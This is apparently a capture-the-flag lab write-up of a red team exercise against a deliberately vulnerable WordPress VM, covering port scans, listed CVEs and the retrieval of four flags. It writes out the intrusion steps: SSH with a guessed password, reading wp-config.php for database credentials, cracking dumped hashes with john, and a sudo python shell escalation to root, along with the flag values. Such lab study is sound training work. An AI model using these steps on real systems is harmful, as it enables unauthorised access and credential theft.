# Red Team: Summary of Operations
Nicole Kemp

19/05/22

# Table of Contents
- ### Exposed Services
- ### Critical Vulnerabilities
- ### Exploit - Using Wordpress
- ### Exploit - Finding `Flags.txt`

# Exposed Services:

Nmap scan results for each machine reveal the below services and OS details:

` netdiscover -r 192.168.1.255/16`
  # ![screenshot](netdiscover%20192.168.1.255%2016.jpg)

### This scan identifies the services below as potential points of entry:

    - Name of VM: Target 1
    - Operating System: Linux
    - Purpose: Defensive Blue Team
    - IP Address: 192.168.1.110

![screenshot:](nmap%20-sV%20192.168.1.110.jpg)

### Target 1's ports and services:
    - Port 22/tcp open ssh (service) OpenSSH 6.7p1 Debian 5+deb8u4
    - Port 80/tcp open http (service) Apache httpd 2.4.10 ((Debian))
    - Port 111/tcp open rpcbind (service) 2-4 (RPC #100000)
    - Port 139/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X
    - Port 445/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X

### Target 1's vulnerabilities:
    - Open SSH (CVE-2021-28041)
    - Apache https 2.4.10 (CVE-2017-15710)
    - Exploit on open rpcbind port could lead to remote DoS (CVE-2017-8779)
    - Samba NetBIOS (CVE-2017-7494)


# Critical Vulnerabilities

### Network Mapping and User Enumeration (WordPress site). 

- Nmap was used to discover open ports.
- Able to discover open ports and tailor their attacks accordingly.

### Weak User Password
- A user had a weak password and the attackers were able to discover it by guessing.
- Able to correctly guess a user's password and SSH into the web server.

### Unsalted User Password Hash (WordPress database)
- Wpscan was utilized by attackers in order to gain username information.
- The username info was used by the attackers to help gain access to the web server.

### MySQL Database Access
- The attackers were able to discover a file containing login information for the MySQL database.
- Able to use the login information to gain access to the MySQL database.

### MySQL Data Exfiltration
- By browsing through the various tables in the MySQL database the attackers were able to discover password hashes of all the users.
- The attackers were able to exfiltrate the password hashes and crack them with John the Ripper.

### Misconfiguration of User Privileges/Privilege Escalation
- The attackers noticed that Steven had sudo privileges for python.
- Able to utilize Steven’s python privileges in order to escalate to root 

## Exploit - Using Wordpress

## Exploit - Finding `Flags.txt`

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - flag1.txt: `flag1{b9bbcb33e11b80be759c4e844862482d}`
    - **Exploit Used**
      - SSH into Michael’s account and look in `the/var/www files`
      - The command run: `ssh michael@192.168.1.110`
      - The username and password michael were identical,allowing for the ssh connection.
![Screenshot](Flag%201%5Cfound%20Flag%201.jpg)
![Screenshot](Flag%201%5CFlag%201.jpg)


  - `flag2.txt`: `flag2{fc3fd58dcdad9ab23faca6e9a36e581c}`
    - **Exploit Used**
      - Command: ssh into Michael’s account and look in the `/var/www files`
      - Command: `cd /var/www`
      - Command: `ls -lah`
      - Command: `cat flag2.txt`

      Visited the IP address of the target `192.168.1.110` over HTTP port 80.
      leads to this website: ![](Main%20exploit%5C(8)Target-IP-address-192.168.1.110-HTTP-port-80-Raven%20Security.jpg)![](Flag%202%5CFlag%202.jpg)![](Flag%202%5Cfound%20Flag%202.jpg)


- `flag3.txt`: `flag3{afc01ab56b50591e7dccf93122770cd2}`
    - **Exploit Used**
      - Continued using michael shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
      - Command: `cd /var/www/html/wordpress/`
      - Command: `cat /var/www/html/wordpress/wp-config.php`
      - ![](Flag%203%5CFlag%203,%20(and%204).jpg)

- `flag4.txt`: `flag4{715dea6c055b9fe3337544932f2941ce}`
    - **Exploit Used**
      - Used john to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.
      - Cracking the password hash with `john`.
      - Copied password hash from MySQL into `~/root/wp_hashes.txt` and cracked with john to discover Steven’s password is `pink84`.
      - Command: `john wp_hashes.txt`
      - Secure a user shell as the user whose password you cracked.
      - Command: ssh steven@192.168.1.110
      - *Password: pink84
      - Escalating to root: sudo -l
      - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
      - Searched for the root directory for Flag 4.
      - Command: cd /root/
      - Command: ls
      - Command: cat flag4.txt
      - Screenshot of Flag 4:![](Flag%204%5CFlag%204.jpg)
